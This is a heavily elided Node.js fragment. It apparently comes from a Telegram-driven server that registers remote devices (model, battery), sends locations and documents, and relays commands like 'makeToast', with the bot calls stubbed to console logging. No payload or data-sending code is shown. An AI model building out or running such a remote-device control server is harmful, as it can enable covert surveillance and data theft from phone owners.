...
class telegramBot {
    sendDocument(chatId, buffer, options, fileOptions) {
        console.log('sendDocument called with:');
    ...
    sendLocation(chatId, latitude, longitude, options) {
        console.log('sendLocation called with:');
        console.log('chatId:', chatId);
    ...
    on(command, callback) {
        console.log('on called with:');
        console.log('command:', command);
    }
}

const appBot = new telegramBot();

app.get('/', function (req, res) {
    res.send('<h1 align="center">𝙎𝙚𝙧𝙫𝙚𝙧 𝙪𝙥𝙡𝙤𝙖𝙙𝙚𝙙 𝙨𝙪𝙘𝙘𝙚𝙨𝙨𝙛𝙪𝙡𝙡𝙮</h1>')
})

//Http server functions - Data uploading functions
...
app.get('/command', function (req, res) {
    //TODO Use this to send command using webservice or api postman
    res.send('')
})
...
appSocket.on('connection', (ws, req) => {
    ...
    //On client connect - it will set UUID for client
    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
    ...
    //Notifiy host - new device is connected.
    ...
    //Notify host - new device is disconnected. and remove client from list
...
appBot.on('message', (message) => {
    ...
    if (message.reply_to_message) {
        ...
        if (message.reply_to_message.text.includes('makeToast')) {
